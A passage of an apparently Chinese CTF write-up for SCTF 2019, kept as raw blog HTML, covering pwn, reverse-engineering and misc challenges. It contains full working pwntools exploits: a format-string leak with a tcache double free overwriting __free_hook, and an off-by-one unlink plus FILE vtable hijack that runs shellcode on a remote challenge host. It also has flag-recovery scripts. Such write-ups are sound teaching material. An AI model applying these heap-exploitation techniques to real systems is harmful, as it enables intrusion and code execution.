class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(num)</span>:</span></span><br><span class="line">        sla(<span class="string">'choice:'</span>,num)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(asize,acon)</span>:</span></span><br><span class="line">        choice(<span class="number">1</span>)</span><br><span class="line">        sla(<span class="string">'size:'</span>,asize)</span><br><span class="line">        sla(<span class="string">'note:'</span>,acon)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(aid)</span>:</span></span><br><span class="line">        choice(<span class="number">2</span>)</span><br><span class="line">        sla(<span class="string">'index:'</span>,aid)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    sla(<span class="string">'SCTF:'</span>,<span class="string">'%a%a%a%a%a'</span>)</span><br><span class="line">    ru(<span class="string">'0x0p+00x0p+00x0.0'</span>)</span><br><span class="line">    libc_base = (int(ru(<span class="string">'p'</span>),<span class="number">16</span>) &lt;&lt; <span class="number">4</span>) - <span class="number">0x18b720</span></span><br><span class="line">    log.success(<span class="string">"libc_base = %s"</span>%hex(libc_base))</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.26.so'</span>)</span><br><span class="line">    malloc_hook = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    free_hook = libc_base + <span class="number">0x18d5a8</span></span><br><span class="line">    malloc_hook = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    system = libc_base + <span class="number">0x21f80</span></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">    add(<span class="number">0x30</span>,<span class="string">'111'</span>)</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">'size:'</span>,<span class="number">0</span>)<span class="comment">#2</span></span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">0x10</span>,p64(free_hook))</span><br><span class="line">    log.success(<span class="string">"free_hook = %s"</span>%hex(free_hook))</span><br><span class="line">    add(<span class="number">8</span>,<span class="string">'AAA'</span>)</span><br><span class="line">    add(<span class="number">0x18</span>,p64(system))</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#ctx.debug()</span></span><br><span class="line">    irt()</span><br></pre></td></tr></table></figure><h3 id="easy-heap"><a href="#easy-heap" class="headerlink" title="easy_heap"></a>easy_heap</h3><p> 这个pwn题漏洞很明显，在0xe2d处，看见该读函数存在一字节溢出，该字节为0。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">some_read_nterm_0end</span><span class="params">(<span class="keyword">char</span> *dst, <span class="keyword">unsigned</span> __int64 len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+13h] [rbp-Dh]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; len; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL) &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">"Read failed!\n"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( buf == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    dst[i] = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( i == len )</span><br><span class="line">    dst[i] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结合程序本身，只有程序基地址的泄露，以及mmap分配的可读/写/执行段的地址，没有libc或者堆栈地址。由此大致可猜测这个是需要最终执行shellcode的。</p><p>首先可以使用一字节溢出进行unlink攻击，由此获取任意写的能力，将shellcode写入mmap段，然后就需要考虑如何劫持控制流。</p><p>由于给的libc是2.23版本，该版本是没有对_IO_File结构体的vtable进行检查的，所以这个可以通过篡改unsorted bin的bk指针至_IO_list_all-0x10处，导致_IO_list_all被篡改，最终进行一个经典的文件结构体伪造，vtable即指向我们可控的程序段，里面则写上mmap段地址，当出现堆错误打印信息时，即可触发。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PwnContext <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    context.terminal = [<span class="string">'tmux'</span>, <span class="string">'split'</span>, <span class="string">'-h'</span>]</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    <span class="comment">#-----function for quick script-----#</span></span><br><span class="line">    s       = <span class="keyword">lambda</span> data               :ctx.send(str(data))        <span class="comment">#in case that data is a int</span></span><br><span class="line">    sa      = <span class="keyword">lambda</span> delim,data         :ctx.sendafter(str(delim), str(data)) </span><br><span class="line">    st      = <span class="keyword">lambda</span> delim,data         :ctx.sendthen(str(delim), str(data)) </span><br><span class="line">    sl      = <span class="keyword">lambda</span> data               :ctx.sendline(str(data)) </span><br><span class="line">    sla     = <span class="keyword">lambda</span> delim,data         :ctx.sendlineafter(str(delim), str(data))</span><br><span class="line">    r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :ctx.recv(numb)</span><br><span class="line">    ru      = <span class="keyword">lambda</span> delims, drop=<span class="keyword">True</span>  :ctx.recvuntil(delims, drop)</span><br><span class="line">    irt     = <span class="keyword">lambda</span>                    :ctx.interactive()</span><br><span class="line">    </span><br><span class="line">    rs      = <span class="keyword">lambda</span> *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">    leak    = <span class="keyword">lambda</span> address, count=<span class="number">0</span>   :ctx.leak(address, count)</span><br><span class="line">    </span><br><span class="line">    uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">    uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">    </span><br><span class="line">    ctx.binary = <span class="string">'./easy_heap'</span></span><br><span class="line">    ctx.remote = (<span class="string">'132.232.100.67'</span>, <span class="number">10004</span>)</span><br><span class="line">    </span><br><span class="line">    ctx.custom_lib_dir = <span class="string">'/root/share/project/glibc-all-in-one/libs/2.23-0ubuntu11_amd64'</span></span><br><span class="line">    <span class="comment">#ctx.remote_libc = './libc.so.6'</span></span><br><span class="line">    ctx.debug_remote_libc = <span class="keyword">True</span></span><br><span class="line">    </span><br><span class="line">    ctx.symbols = &#123;</span><br><span class="line">        <span class="string">'lst'</span>:<span class="number">0x202060</span>,</span><br><span class="line">        <span class="string">'cnt'</span>:<span class="number">0x202040</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">        sl(<span class="number">1</span>)</span><br><span class="line">        sla(<span class="string">'Size'</span>, size)</span><br><span class="line">        ru(<span class="string">'Address '</span>)</span><br><span class="line">        addr = int(ru(<span class="string">'\n'</span>), <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">return</span> addr</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">        sl(<span class="number">2</span>)</span><br><span class="line">        sla(<span class="string">'Index'</span>, idx)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">        sl(<span class="number">3</span>)</span><br><span class="line">        sla(<span class="string">'Index'</span>, idx)</span><br><span class="line">        sa(<span class="string">'Content'</span>, content)</span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            rs(<span class="string">'remote'</span>)</span><br><span class="line">            <span class="comment">#ctx.debug(gdbscript='c')</span></span><br><span class="line">            </span><br><span class="line">            ru(<span class="string">'Mmap: '</span>)</span><br><span class="line">            mmap_addr = int(ru(<span class="string">'\n'</span>), <span class="number">16</span>)</span><br><span class="line">            </span><br><span class="line">            prog_base = add(<span class="number">0xf8</span>) - <span class="number">0x202068</span></span><br><span class="line">            add(<span class="number">0xf0</span>)</span><br><span class="line">            </span><br><span class="line">            add(<span class="number">0x20</span>)</span><br><span class="line">            </span><br><span class="line">            target = prog_base+<span class="number">0x202068</span></span><br><span class="line">            payload1 = p64(<span class="number">0</span>) + p64(<span class="number">0xf1</span>)</span><br><span class="line">            payload1 += p64(target<span class="number">-0x18</span>) + p64(target<span class="number">-0x10</span>)</span><br><span class="line">            payload1 = payload1.ljust(<span class="number">0xf0</span>, <span class="string">'\0'</span>)</span><br><span class="line">            payload1 += p64(<span class="number">0xf0</span>)</span><br><span class="line">            fill(<span class="number">0</span>, payload1)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#unlink </span></span><br><span class="line">            free(<span class="number">1</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="function"><span class="keyword">def</span> <span class="title">vuln_write</span><span class="params">(addr, content)</span>:</span></span><br><span class="line">                payload = p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">                payload += p64(<span class="number">0xf8</span>) + p64(prog_base+<span class="number">0x202050</span>)</span><br><span class="line">                payload += p64(<span class="number">0x1000</span>) + p64(addr)</span><br><span class="line">                fill(<span class="number">0</span>, payload + <span class="string">'\n'</span>)</span><br><span class="line">                sleep(<span class="number">0.5</span>)</span><br><span class="line">                fill(<span class="number">1</span>, content + <span class="string">'\n'</span>)</span><br><span class="line">                </span><br><span class="line">            </span><br><span class="line">            vuln_write(mmap_addr, asm(shellcraft.sh()))</span><br><span class="line">            </span><br><span class="line">            add(<span class="number">0x20</span>)</span><br><span class="line">            </span><br><span class="line">            payload2 = p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">            payload2 += p64(<span class="number">0xf8</span>) + p64(prog_base+<span class="number">0x202050</span>)</span><br><span class="line">            payload2 += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">            payload2 += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">            payload2 += p64(<span class="number">8</span>) + <span class="string">'\x48'</span></span><br><span class="line">            fill(<span class="number">0</span>, payload2 + <span class="string">'\n'</span>)</span><br><span class="line">            fill(<span class="number">3</span>, <span class="string">'\x61\x00\n'</span>)</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            payload3 = p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">            payload3 += p64(<span class="number">0xf8</span>) + p64(prog_base+<span class="number">0x202050</span>)</span><br><span class="line">            payload3 += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">            payload3 += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">            payload3 += p64(<span class="number">8</span>) + <span class="string">'\x58'</span></span><br><span class="line">            fill(<span class="number">0</span>, payload3 + <span class="string">'\n'</span>)</span><br><span class="line">            fill(<span class="number">3</span>, <span class="string">'\x10\x75\n'</span>)</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            payload4 = p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">            payload4 += p64(<span class="number">0xf8</span>) + p64(prog_base+<span class="number">0x202050</span>)</span><br><span class="line">            payload4 += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">            payload4 += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">            payload4 += p64(<span class="number">0x1000</span>) + <span class="string">'\x60'</span></span><br><span class="line">            fill(<span class="number">0</span>, payload4 + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            fake_vtable = prog_base + <span class="number">0x202070</span></span><br><span class="line">            payload5 = p64(<span class="number">2</span>) + p64(<span class="number">3</span>)</span><br><span class="line">            payload5 = payload5.ljust(<span class="number">0xb8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">            payload5 += p64(fake_vtable)</span><br><span class="line">            </span><br><span class="line">            fill(<span class="number">3</span>, payload5 + <span class="string">'\n'</span>)</span><br><span class="line">            </span><br><span class="line">            payload6 = p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">            payload6 += p64(<span class="number">0xf8</span>) + p64(prog_base+<span class="number">0x202050</span>)</span><br><span class="line">            payload6 += p64(mmap_addr) * <span class="number">8</span></span><br><span class="line">            fill(<span class="number">0</span>, payload6 + <span class="string">'\n'</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#now trigger</span></span><br><span class="line">            sleep(<span class="number">0.1</span>)</span><br><span class="line">            sl(<span class="number">1</span>)</span><br><span class="line">            sla(<span class="string">'Size'</span>, <span class="number">1</span>)</span><br><span class="line">            sleep(<span class="number">0.1</span>)</span><br><span class="line">            <span class="keyword">if</span> ctx.connected():</span><br><span class="line">                irt()</span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="Crackme"><a href="#Crackme" class="headerlink" title="Crackme"></a>Crackme</h3><p>有个全局字符串，不运行值不是这个的：<br>nKnbHsgqD3aNEB91jB3gEzAr+IklQwT1bSs3+bXpeuo=</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">iv = <span class="string">b'\x00'</span>*<span class="number">16</span></span><br><span class="line">key = <span class="string">'sycloversyclover'</span></span><br><span class="line">mode = AES.MODE_CBC</span><br><span class="line">cryptos = AES.new(key, mode, iv)</span><br><span class="line">a = <span class="string">b'sctf'</span>*<span class="number">4</span></span><br><span class="line">raw = cryptos.decrypt(base64.b64decode(<span class="string">'nKnbHsgqD3aNEB91jB3gEzAr+IklQwT1bSs3+bXpeuo='</span>))</span><br><span class="line">flag = <span class="string">b''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    flag += bytes(chr(a[i] ^ raw[i]), encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">flag += raw[<span class="number">16</span>:].replace(<span class="string">b'\x05'</span>, <span class="string">b''</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h3 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h3><p>题目总共分为三个关卡，解出三个关卡就可以得到flag</p><p>第一关是一个迷宫，共分为5层</p><p><img src="https://img.5am3.com/20190624156134900767013.png" alt="20190624156134900767013.png"></p><p>wasd分别上下左右，x是上一层，y是下一层。</p><p>密码：ddwwxxssxaxwwaassyywwdd</p><p>第二层是一个base64的解密函数，由于不是逆向选手，傻傻地怼汇编了好久，发现是base64</p><p>于是，将sctf_9102字符串base64加密就得到pass了。c2N0Zl85MTAy，但是，我用c2N0Zl85MTAyCg也是可以过的，</p><p>第三层是sm4的魔改，我还原了一下这个加密，由于对称加密，不带秘钥，实际将给定的字符串反过来，再加密就是明文了</p><p><img src="https://img.5am3.com/20190624156134902133599.png" alt="20190624156134902133599.png"></p><p>其实也可以，将反过来的字符串输入至第三关中，从内存dump下加密的结果，有兴趣可以试下。</p><h3 id="Strange-apk"><a href="#Strange-apk" class="headerlink" title="Strange apk"></a>Strange apk</h3><p>Apk脱壳：容易观察到apk使用第一代dex落地加载加固保护技术，解密算法为简单的异或。</p><p><img src="https://img.5am3.com/20190624156134920084292.png" alt="20190624156134920084292.png"></p><p><img src="https://img.5am3.com/20190624156134921258930.png" alt="20190624156134921258930.png"></p><p>观察到flag为30个字符，前十二个字符base64加密后未“<strong>c2N0ZntXM2xjMG1l</strong>”，明文为“sctf{W3lc0me”，后面18个字符会被传到其他activity。</p><p><img src="https://img.5am3.com/20190624156134923825127.png" alt="20190624156134923825127.png"></p><p>后18个字符验证逻辑如下，encode函数参数一为该18个字符，参数二为syclover进行md5加密后的结果。分析后发现只需要将”<del>8t808_8A8n848r808i8d8-8w808r8l8d8}8”中所有的‘8’去掉即可，与前面的结果拼接故得到flag为“sctf{W3lc0me</del>t0_An4r0id-w0rld}”</p><p><img src="https://img.5am3.com/20190624156134925922058.png" alt="20190624156134925922058.png"></p><p><img src="https://img.5am3.com/2019062415613492699126.png" alt="2019062415613492699126.png"></p><h3 id="Music"><a href="#Music" class="headerlink" title="Music"></a>Music</h3><p>主activity只有没用的听音乐功能，是为了浪费调试时间的。直接修改入口类为Main2Activity。接着分析发现，程序执行成功与否取决于f变量。</p><p><img src="https://img.5am3.com/20190624156134929292773.png" alt="20190624156134929292773.png"></p><p>逻辑很简单，可以观察出a方法使用的变形版的rc4加密算法，加密后需要与某字符串相等（资源定位到改字符串为“C28BC39DC3A6C283C2B3C39DC293C289C2B8C3BAC29EC3A0C3A7C29A1654C3AF28C3A1C2B1215B53”）</p><p><img src="https://img.5am3.com/20190624156134932299445.png" alt="20190624156134932299445.png"></p><p><img src="https://img.5am3.com/20190624156134934463943.png" alt="20190624156134934463943.png"></p><p>至于rc4加密的第二个参数就是key，直接用JEB动态调试得到 </p><blockquote><p>E7E64BF658BAB14A25C9D67A054CEBE5</p></blockquote><p>唯一的坑点就是RC4算法</p><p><code>v3_1[v6] = ((char)(v2_1[v6] - v4 ^ (((char)v1[(v1[v4] + v1[v4] % v8) % v8]))));</code></p><p>这一行代码进行了变形，同时涉及到运算符优先级问题，将其改为</p><p><code>v3_1[v6] = (char)((v2_1[v6] ^ (((char)v1[(v1[v4] + v1[v4] % v8) % v8])))+ v4 );</code></p><p>再进行RC4解密即可成功得到flag</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>不知道谁签的….</p><h3 id="头号玩家"><a href="#头号玩家" class="headerlink" title="头号玩家"></a>头号玩家</h3><p>飞机一直往前开，开出去左上方显示flag，emmm，只要游戏打得好</p><p><img src="https://img.5am3.com/20190624156136139462352.png" alt="20190624156136139462352.png"></p><h3 id="Maaaaaaze"><a href="#Maaaaaaze" class="headerlink" title="Maaaaaaze"></a>Maaaaaaze</h3><p>最终是4056</p><p>处理一下网页然后算就完事了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">length=<span class="number">100</span></span><br><span class="line">width=<span class="number">100</span></span><br><span class="line">maze = [[[<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>] <span class="keyword">for</span> j <span class="keyword">in</span> range(width)]<span class="keyword">for</span> i <span class="keyword">in</span> range(length)]</span><br><span class="line">visited = [[<span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> range(width)]<span class="keyword">for</span> i <span class="keyword">in</span> range(length)]</span><br><span class="line">mlength = <span class="number">0</span></span><br><span class="line">mnode = (<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dfs</span><span class="params">(i, j, depth)</span>:</span></span><br><span class="line"> <span class="keyword">global</span> mlength</span><br><span class="line"> <span class="comment"># print (i,j)</span></span><br><span class="line"> <span class="comment"># print maze[i][j]</span></span><br><span class="line"> visited[i][j]=<span class="number">1</span></span><br><span class="line"> <span class="comment"># print [visited[i-1][j], visited[i][j+1], visited[i-1][j], visited[i][j-1]]</span></span><br><span class="line"> <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">  test = <span class="number">0</span></span><br><span class="line">  ti = <span class="number">0</span></span><br><span class="line">  tj = <span class="number">0</span></span><br><span class="line">  <span class="keyword">if</span> maze[i][j][<span class="number">0</span>] <span class="keyword">and</span> <span class="keyword">not</span> visited[i<span class="number">-1</span>][j]:</span><br><span class="line">   test += <span class="number">1</span></span><br><span class="line">   ti = <span class="number">-1</span></span><br><span class="line">  <span class="keyword">if</span> maze[i][j][<span class="number">1</span>] <span class="keyword">and</span> <span class="keyword">not</span> visited[i][j+<span class="number">1</span>]:</span><br><span class="line">   test += <span class="number">1</span></span><br><span class="line">   tj = <span class="number">1</span></span><br><span class="line">  <span class="keyword">if</span> maze[i][j][<span class="number">2</span>] <span class="keyword">and</span> <span class="keyword">not</span> visited[i+<span class="number">1</span>][j]:</span><br><span class="line">   test += <span class="number">1</span></span><br><span class="line">   ti = <span class="number">1</span></span><br><span class="line">  <span class="keyword">if</span> maze[i][j][<span class="number">3</span>] <span class="keyword">and</span> <span class="keyword">not</span> visited[i][j<span class="number">-1</span>]:</span><br><span class="line">   test += <span class="number">1</span></span><br><span class="line">   tj = <span class="number">-1</span></span><br><span class="line">  <span class="keyword">if</span> test == <span class="number">1</span>:</span><br><span class="line">   i+=ti</span><br><span class="line">   j+=tj</span><br><span class="line">   depth+=<span class="number">1</span></span><br><span class="line">   visited[i][j]=<span class="number">1</span></span><br><span class="line">  <span class="keyword">else</span>: </span><br><span class="line">   <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> <span class="keyword">if</span> depth&gt;mlength:</span><br><span class="line">  <span class="keyword">global</span> mnode</span><br><span class="line">  mlength = depth</span><br><span class="line">  mnode = (i,j)</span><br><span class="line"> <span class="keyword">if</span> maze[i][j][<span class="number">0</span>] <span class="keyword">and</span> <span class="keyword">not</span> visited[i<span class="number">-1</span>][j]:</span><br><span class="line">  dfs(i<span class="number">-1</span>,j,depth+<span class="number">1</span>)</span><br><span class="line"> <span class="keyword">if</span> maze[i][j][<span class="number">1</span>] <span class="keyword">and</span> <span class="keyword">not</span> visited[i][j+<span class="number">1</span>]:</span><br><span class="line">  dfs(i,j+<span class="number">1</span>,depth+<span class="number">1</span>)</span><br><span class="line"> <span class="keyword">if</span> maze[i][j][<span class="number">2</span>] <span class="keyword">and</span> <span class="keyword">not</span> visited[i+<span class="number">1</span>][j]:</span><br><span class="line">  dfs(i+<span class="number">1</span>,j,depth+<span class="number">1</span>)</span><br><span class="line"> <span class="keyword">if</span> maze[i][j][<span class="number">3</span>] <span class="keyword">and</span> <span class="keyword">not</span> visited[i][j<span class="number">-1</span>]:</span><br><span class="line">  dfs(i,j<span class="number">-1</span>,depth+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"> sourse = open(<span class="string">'./Maze.html'</span>).read()</span><br><span class="line"> soup = BeautifulSoup(sourse,<span class="string">"html.parser"</span>)</span><br><span class="line"> result = soup.select(<span class="string">'td'</span>)</span><br><span class="line"> <span class="comment"># print result</span></span><br><span class="line"> style = [i.get(<span class="string">"style"</span>) <span class="keyword">for</span> i <span class="keyword">in</span> result]</span><br><span class="line"> <span class="keyword">for</span> 